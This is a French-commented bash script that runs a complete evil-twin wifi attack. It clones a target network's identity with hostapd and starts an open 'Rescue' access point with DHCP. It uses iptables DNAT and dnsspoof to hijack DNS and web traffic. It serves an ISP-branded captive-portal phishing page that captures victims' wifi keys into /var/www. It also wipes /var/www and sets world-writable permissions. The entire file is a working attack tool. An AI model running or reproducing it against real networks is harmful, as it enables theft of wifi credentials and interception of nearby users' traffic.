#!/usr/bin/env bash
#
# Fichiers attendus dans le MÊME dossier que le script :
#   hostapd.conf   <- channel.txt, bssid.txt, essid.txt          (réseau WPA)
#   (réseau ouvert : config hostapd générée directement, canal 1, essid.txt + "open", DHCP via dnsmasq sur 175.0.0.0/24)
#   hostaghz.conf  <- channel_5ghz.txt, bssid_5ghz.txt, essid5ghz.txt  (réseau 5 GHz)
#

# Tout se passe dans le dossier du script
# Répertoire absolu contenant le script
SCRIPT_DIR="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd)" || exit 1
cd "$SCRIPT_DIR" || exit 1

RED=$'\e[31m'; GRN=$'\e[32m'; YEL=$'\e[33m'; CYN=$'\e[36m'; RST=$'\e[0m'

# Rédefinition des couleurs également présentes dans le premier scrupt


# Tous les fichiers de travail restent dans le dossier du script
WORKDIR="$SCRIPT_DIR/.multi_ap_work.$$"

# Copies des configurations conservées après l'arrêt du script
TRACE_DIR="$SCRIPT_DIR/multi_ap_configs_$(date +%Y%m%d_%H%M%S)"

# Configuration générée pour le réseau ouvert
OPEN_CONF="$SCRIPT_DIR/hostapdd.conf"

# Les 3 points d'accès, dans l'ordre de lancement (réseau ouvert en dernier)
AP_CONFS=("hostapd.conf" "hostaghz.conf" "hostapdd.conf")
AP_DESC=("WPA network" "WPA 5 GHz network" "Evil twin")
AP_NEEDS5=(0 1 0)

declare -A PHY AP_OK B24_OK B5_OK USED
IFACES=()
ASSIGN=("" "" "")   # interface choisie pour chaque point d'accès
STARTED=()
NM_UNMANAGED=()
DHCP_PID=""
DHCP_IFACE=""

info()  { echo "${CYN}[*]${RST} $*"; }
ok()    { echo "${GRN}[+]${RST} $*"; }
warn()  { echo "${YEL}[!]${RST} $*"; }
err()   { echo "${RED}[x]${RST} $*"; }

cleanup() {
    echo
    info "Shutdown networks and clean up..."
    if [[ -n "$DHCP_PID" ]]; then
        kill "$DHCP_PID" 2>/dev/null
    fi
    [[ -n "$DHCP_IFACE" ]] && ip addr flush dev "$DHCP_IFACE" 2>/dev/null
    for i in "${STARTED[@]}"; do
        [[ -f "$WORKDIR/$i.pid" ]] && kill "$(cat "$WORKDIR/$i.pid")" 2>/dev/null
    done
    for i in "${NM_UNMANAGED[@]}"; do
        nmcli device set "$i" managed yes 2>/dev/null
    done
    rm -rf "$WORKDIR"
    echo "multi_ap folder and all txt file are saved for debug mode after the attack..."
    echo "Reestarting network-manager..."
    systemctl start NetworkManager.service
sleep 4;
    rm -rf multi*
    ok "Done."
}

# set_param <fichier> <clé> <valeur> : remplace (ou ajoute) la ligne clé=valeur
set_param() {
    [[ -n "$(tail -c1 "$1")" ]] && echo >> "$1"   # fin de fichier sans saut de ligne
    sed -i "/^$2=/d" "$1"
    echo "$2=$3" >> "$1"
}

# check_files <fichier> ... : affiche les fichiers manquants, retourne 1 s'il en manque
check_files() {
    local f manquant=0
    for f in "$@"; do
        if [[ ! -f "$f" ]]; then
            err "File not found : $f"
            manquant=1
        fi
    done
    return $manquant
}

show_cards() {
    echo
    printf "%-4s %-12s %-8s %-15s %-8s %-8s %s\n" "N°" "Interface" "Phy" "hostapd" "2.4GHz" "5GHz" "Statut"
    echo "---------------------------------------------------------------------------"
    local n=0 i
    for i in "${IFACES[@]}"; do
        n=$((n+1))
        printf "%-4s %-12s %-8s " "$n" "$i" "${PHY[$i]}"
        if [[ ${AP_OK[$i]} -eq 1 ]]; then printf "%s%-15s%s " "$GRN" "compatible" "$RST"
        else printf "%s%-15s%s " "$RED" "NOT compatible" "$RST"; fi
        if [[ ${B24_OK[$i]} -eq 1 ]]; then printf "%s%-8s%s " "$GRN" "oui" "$RST"
        else printf "%s%-8s%s " "$RED" "NO" "$RST"; fi
        if [[ ${B5_OK[$i]} -eq 1 ]]; then printf "%s%-8s%s " "$GRN" "oui" "$RST"
        else printf "%s%-8s%s " "$RED" "NO" "$RST"; fi
        if [[ -n "${USED[$i]}" ]]; then printf "%s\n" "Used by ${USED[$i]}"
        else printf "free\n"; fi
    done
    echo "---------------------------------------------------------------------------"
}

start_dhcp() { # <interface> : configure et démarre isc-dhcp-server pour le réseau ouvert
    # Reprend fidèlement la configuration qui fonctionnait.
    local i="$1"

    if ! command -v dhcpd >/dev/null 2>&1; then
        warn "DHCPD not found (isc-dhcp-server not installed) : no DHCP server on $i."
        return
    fi

    info "Configuring DHCP on $i (175.0.0.0/24)..."
    DHCP_IFACE="$i"

    cat <<-EOF > /etc/dhcpd.conf
	option T150 code 150 = string;
	deny client-updates;
	one-lease-per-client false;
	allow bootp;
	ddns-updates off;
	ddns-update-style interim;
	authoritative;
	subnet 175.0.0.0 netmask 255.255.255.0 {
	interface $i;
	range 175.0.0.2 175.0.0.10;
	option routers 175.0.0.1;
	option subnet-mask 255.255.255.0;
	option domain-name-servers 175.0.0.1;
	allow unknown-clients;
	}
	EOF

    ifconfig "$i" up
    sudo sysctl net.ipv4.ip_forward=1
    ifconfig "$i" 175.0.0.1 netmask 255.255.255.0
    ifconfig "$i" mtu 1400
    iptables --flush
    iptables --table nat --flush
    iptables --delete-chain
    iptables --table nat --delete-chain
    sleep 2;
    route add -net 175.0.0.0 netmask 255.255.255.0 gw 175.0.0.1 &> /dev/null
    iptables -t nat -A PREROUTING -p udp --dport 53 -j DNAT --to 175.0.0.1
    iptables -P FORWARD ACCEPT
    iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to 175.0.0.1:80

    sleep 1;
    echo > /var/lib/dhcp/dhcpd.leases
    sleep 1;
    dhcpd -d /etc/dhcpd.conf &
    DHCP_PID=$!
    sleep 3;
dnsspoof -i $i &
sleep 2;
mot="$1"
fichier="$(cat essid.txt)"
fichier="essid.txt"
mots=("Livebox" "SFR" "Freebox" "Bbox")
pagedefaut=("404")
trouve=false

for mot in "${mots[@]}"; do
    if grep -qF "$mot" "$fichier"; then
        trouve=true
        echo -e "$yellow Webpage : $mot"

        # Ta condition / action
        if [[ "$mot" == "Livebox" ]]; then
            echo "Livebox  trouvé"
            echo "$mot"wpa3 > page.txt
        elif [[ "$mot" == "SFR" ]]; then
            echo "SFR trouvé"
            echo "$mot"wpa3 > page.txt
        elif [[ "$mot" == "Freebox" ]]; then
            echo "Freebox trouvé"
            echo "$mot"wpa3 > page.txt
        elif [[ "$mot" == "Bbox" ]]; then
            echo "Bbox trouvé"
            echo "$mot"wpa3 > page.txt
        fi

        break
    fi
done

if $trouve; then
    echo "Setting up the webpage"
else
    echo "Webpage not found, don't worry we will use a default page"
    echo "404wpa3" > page.txt
fi
tr '[:upper:]' '[:lower:]' < page.txt > page.tmp &&
mv page.tmp page.txt
page="$(cat page.txt)"
echo "${page}"
while [ -z "${page}" ]; do read -r ${page}; done
echo -e "$yellow Configuring apache..."
cd /var/www/
rm -rf *
mkdir qrcode  # We need to create this folder because github doesn't like empty folder...
cat <<-EOF > ncsi.txt
Microsoft NCSI
EOF
sleep 1;
cat <<-EOF > connecttest.txt
Microsoft Connect Test
EOF
sleep 1;
mkdir generate_204
sleep 1;
cd /var/www/generate_204/
cat <<-EOF > index.php
<?php header('Location: /msftconnecttest/index.php'); ?>
EOF
sleep 1;
cd /var/www/
mkdir msftconnecttest
sleep 1;
mkdir msftnci
sleep 1;
cd /var/www/msftnci/
cat <<-EOF > index.php
<?php header('Location: /msftconnecttest/index.php'); ?>
EOF
cd /var/www/
mkdir redirect
sleep 1;
cd /var/www/msftconnecttest/
mkdir qrcode  # We need to create this folder because github doesn't like empty folder...
cat <<-EOF > connecttest.txt
Microsoft Connect Test
EOF
sleep 1;
cd /var/www/redirect/
cat <<-EOF > index.php
<?php header('Location: /msftconnecttest/index.php'); ?>
EOF
sleep 1;
cd /var/www/
cp -R /etc/${page}/* /var/www/
sleep 3;
mv ${page}.php index.php
chown -R root:www-data /var/www/*
sleep 1;
chmod 764 /var/www/msftconnecttest/qrcode
chmod 764 /var/www/qrcode
cd /var/www/shout/
chown -R root:www-data /var/www/shout/chat.txt
chmod 764 /var/www/shout/chat.txt
chmod  777 *
cd /var/www/msftconnecttest/
cp -R /etc/${page}/msftconnecttest/* /var/www/msftconnecttest/
sleep 3;
cd /var/www/msftconnecttest/
mv ${page}.php index.php
chown -R root:www-data /var/www/*
sleep 1;
cd /var/www/msftconnecttest/shout/
chown -R root:www-data /var/www/msftconnecttest/shout/chat.txt
chmod 764 /var/www/msftconnecttest/shout/chat.txt
chmod  777 *
cd /var/www/msftconnecttest/
if [ -f "cle.txt" ];then
chmod 777 *
chown -R root:www-data /var/www/msftconnecttest/cle.txt
chmod 764 /var/www/msftconnecttest/cle.txt
service apache2 restart
sleep 4;
cd /var/www/
chmod 777 *
chown -R root:www-data /var/www/cle.txt
chmod 764 /var/www/cle.txt
service apache2 restart
sleep 4;
echo -e "\e[1;32m[*] AP created...\e[0m"
else
chmod 777 *
service apache2 restart
sleep 4;
echo -e "\e[1;32m[*] AP created...\e[0m"
fi
}


start_ap() { # <interface> <fichier.conf> <ESSID> <description>
    local i="$1" conf="$2" essid="$3" desc="$4"
    # Trace : copie de la configuration finale utilisée pour ce point d'accès
    cp "$SCRIPT_DIR/$conf" "$TRACE_DIR/$(basename "$conf")" &&
    chmod 600 "$TRACE_DIR/$(basename "$conf")"
    if command -v nmcli >/dev/null 2>&1; then
        nmcli device set "$i" managed no 2>/dev/null && NM_UNMANAGED+=("$i")
    fi
    ip link set "$i" up 2>/dev/null

    local tentative lancee=0
    for tentative in 1 2; do
        hostapd "$SCRIPT_DIR/$conf" > "$WORKDIR/$i.log" 2>&1 &
        echo $! > "$WORKDIR/$i.pid"
        sleep 1
        if kill -0 "$(cat "$WORKDIR/$i.pid")" 2>/dev/null; then
            lancee=1
            break
        fi
        if [[ $tentative -eq 1 ]]; then
            warn "First try failed $conf on $i (due to local rules), new attempt..."
            sleep 2
        fi
    done

    if [[ $lancee -eq 1 ]]; then
        STARTED+=("$i")
        ok "$desc '$essid' started on $i (config : $conf)"
    else
        err "hostapd failed to start $conf on $i after two attempt. Log : $WORKDIR/$i.log"
        [[ -f "$WORKDIR/$i.log" ]] && tail -n 5 "$WORKDIR/$i.log"
    fi
}

# ---------------------------------------------------------------- prérequis
if [[ $EUID -ne 0 ]]; then
    err "Must be started in root (sudo)."
    exit 1
fi
for cmd in iw ip hostapd; do
    if ! command -v "$cmd" >/dev/null 2>&1; then
        err "iw not found : $cmd (ex : apt install hostapd iw iproute2)"
        exit 1
    fi
done
mkdir -p "$WORKDIR" "$TRACE_DIR" || exit 1
chmod 700 "$WORKDIR" "$TRACE_DIR" || exit 1
trap cleanup EXIT
trap 'exit 130' INT TERM
rfkill unblock wifi 2>/dev/null

# ---------------------------------------------------- détection des cartes
for path in /sys/class/net/*/phy80211; do
    [[ -e "$path" ]] || continue
    iface=$(basename "$(dirname "$path")")
    IFACES+=("$iface")
    PHY[$iface]=$(cat "$path/name")
done

if [[ ${#IFACES[@]} -eq 0 ]]; then
    err "No wifi card detected."
    exit 1
fi

CARDS_5G=()
for i in "${IFACES[@]}"; do
    info_txt=$(iw phy "${PHY[$i]}" info 2>/dev/null)

    # Mode AP supporté (compatible hostapd) ?
    if echo "$info_txt" | sed -n '/Supported interface modes:/,/^\t[A-Za-z]/p' | grep -qE '^\s*\* AP$'; then
        AP_OK[$i]=1
    else
        AP_OK[$i]=0
        warn "Card $i doesn't support hostapd (AP mode)."
    fi
    # Fréquences 2.4 GHz / 5 GHz utilisables (non désactivées)
    if echo "$info_txt" | grep -E '^\s+\* 24[0-9]{2}(\.[0-9])? MHz' | grep -vq disabled; then B24_OK[$i]=1; else B24_OK[$i]=0; fi
    if echo "$info_txt" | grep -E '^\s+\* 5[0-8][0-9]{2}(\.[0-9])? MHz' | grep -vq disabled; then B5_OK[$i]=1; else B5_OK[$i]=0; fi

    [[ ${AP_OK[$i]} -eq 1 && ${B5_OK[$i]} -eq 1 ]] && CARDS_5G+=("$i")
done

echo
if [[ ${#CARDS_5G[@]} -gt 0 ]]; then
    ok "Cards with 5 GHz support and hostapd : ${CARDS_5G[*]}"
else
    err "No 5GHz card detected : the AP (hostaghz.conf) will not start."
fi

# ---------------------------------------- choix de la carte pour chaque AP
for idx in 0 1 2; do
    conf="${AP_CONFS[$idx]}"
    desc="${AP_DESC[$idx]}"

    # Reste-t-il des cartes libres ?
    libres=0
    for i in "${IFACES[@]}"; do [[ -z "${USED[$i]}" ]] && libres=$((libres+1)); done
    if [[ $libres -eq 0 ]]; then
        warn "Busy devices : $conf ($desc) will not start."
        continue
    fi
    if [[ ${AP_NEEDS5[$idx]} -eq 1 && ${#CARDS_5G[@]} -eq 0 ]]; then
        warn "No 5 GHz card : $conf ($desc) will not start."
        continue
    fi

    show_cards
    echo "AP $((idx+1))/3 : $conf ($desc)"
    [[ ${AP_NEEDS5[$idx]} -eq 1 ]] && echo "${YEL}(require 5GHz card)${RST}"

    while true; do
        read -rp "Number of the card to use (0 = skip this access point) : " choix
        if [[ "$choix" == "0" ]]; then
            warn "$conf skipped."
            break
        fi
        if ! [[ "$choix" =~ ^[0-9]+$ ]] || (( choix < 1 || choix > ${#IFACES[@]} )); then
            err "Not valid choice."
            continue
        fi
        i="${IFACES[$((choix-1))]}"
        if [[ -n "${USED[$i]}" ]]; then
            err "Card $i is already used by ${USED[$i]}."
            continue
        fi
        if [[ ${AP_OK[$i]} -ne 1 ]]; then
            err "Card $i doesn't support hostapd. Select another (or 0 to skip)."
            continue
        fi
        if [[ ${AP_NEEDS5[$idx]} -eq 1 && ${B5_OK[$i]} -ne 1 ]]; then
            err "Card $i doesn't support 5 GHz band. Select another (or 0 to skip)."
            continue
        fi
        ASSIGN[$idx]="$i"
        USED[$i]="$conf"
        ok "$conf -> $i"
        break
    done
done

if [[ -z "${ASSIGN[0]}${ASSIGN[1]}${ASSIGN[2]}" ]]; then
    err "No access point to start."
    exit 1
fi

# --------------------------------- configuration puis lancement (dans l'ordre)
echo

# 1) hostapd.conf : canal, BSSID, ESSID
if [[ -n "${ASSIGN[0]}" ]]; then
    info "=== hostapd.conf (${ASSIGN[0]}) ==="
    if check_files hostapd.conf channel.txt bssid.txt essid.txt; then
        canal="$(cat channel.txt)"
        BSSID="$(cat bssid.txt)"
        ESSID="$(cat essid.txt)"
        set_param hostapd.conf interface "${ASSIGN[0]}"
        set_param hostapd.conf channel   "$canal"
        set_param hostapd.conf bssid     "$BSSID"
        set_param hostapd.conf ssid      "$ESSID"
        start_ap "${ASSIGN[0]}" hostapd.conf "$ESSID" "WPA network"
    else
        warn "hostapd.conf skipped."
    fi
fi

# 2) hostaghz.conf : réseau 5 GHz
if [[ -n "${ASSIGN[1]}" ]]; then
    info "=== hostaghz.conf (${ASSIGN[1]}) ==="
    if check_files hostaghz.conf channel_5ghz.txt bssid_5ghz.txt essid5ghz.txt; then
        canalghz="$(cat channel_5ghz.txt)"
        BSSIDGHZ="$(cat bssid_5ghz.txt)"
        ESSIDGHZ="$(cat essid5ghz.txt)"
        set_param hostaghz.conf interface "${ASSIGN[1]}"
        set_param hostaghz.conf channel   "$canalghz"
        set_param hostaghz.conf bssid     "$BSSIDGHZ"
        set_param hostaghz.conf ssid      "$ESSIDGHZ"
        start_ap "${ASSIGN[1]}" hostaghz.conf "$ESSIDGHZ" "5 GHz wpa3 netork"
    else
        warn "hostaghz.conf skipped."
    fi
fi

# 3) Réseau ouvert : /tmp/hostapdd.conf généré puis hostapd lancé directement, comme dans la config qui fonctionnait
if [[ -n "${ASSIGN[2]}" ]]; then
    i="${ASSIGN[2]}"
    info "=== Evil-twin ($i) ==="
    if check_files essid.txt; then
        # Génère essid_open.txt à partir de essid.txt, avec "Rescue" ajouté à la fin
        printf '%s-Rescue' "$(cat essid.txt)" > essid_open.txt
        ESSID="$(cat essid_open.txt)"

        if command -v nmcli >/dev/null 2>&1; then
            nmcli device set "$i" managed no 2>/dev/null && NM_UNMANAGED+=("$i")
        fi

cat <<-EOF > "$OPEN_CONF"
interface=$i
ssid=$ESSID
hw_mode=g
channel=1
ieee80211n=1
auth_algs=1
wpa=0
EOF

chmod 600 "$OPEN_CONF"
cp "$OPEN_CONF" "$TRACE_DIR/hostapdd.conf"
chmod 600 "$TRACE_DIR/hostapdd.conf"

sleep 1
hostapd "$OPEN_CONF" > "$WORKDIR/$i.log" 2>&1 &
        echo $! > "$WORKDIR/$i.pid"
        sleep 5

        if kill -0 "$(cat "$WORKDIR/$i.pid")" 2>/dev/null; then
            STARTED+=("$i")
            ok "Evil-twin '$ESSID' started on $i"
            start_dhcp "$i"
        else
            err "Evil-twin failed to start on $i. Log : $WORKDIR/$i.log"
            [[ -f "$WORKDIR/$i.log" ]] && tail -n 5 "$WORKDIR/$i.log"
        fi
    else
        warn "Evil-twin skipped (essid.txt not found)."
    fi
fi

echo
info "Copy of files configuration : $TRACE_DIR"
if [[ ${#STARTED[@]} -eq 0 ]]; then
    err "All access point failed to start."
    exit 1
fi

echo -e "$yellow qrcode or key can be found in /var/www"
echo -e "$green Waiting for someone..."
ok "${#STARTED[@]} Access point currently alive : ${STARTED[*]}"
read -rp "Push Enter or Ctrl+C to stop the script ... " _
